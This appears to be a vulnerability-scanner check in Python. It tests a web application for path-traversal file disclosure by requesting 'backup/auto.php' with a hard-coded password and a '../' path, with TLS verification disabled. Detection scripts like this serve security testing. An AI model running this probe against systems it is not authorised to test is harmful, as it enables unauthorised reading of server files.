import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php"
	headers={'Accept-Encoding': 'deflate'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str("NzbwpQSdbY06Dngnoteo2wdgiekm7j4N") in response.text and "display_errors" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
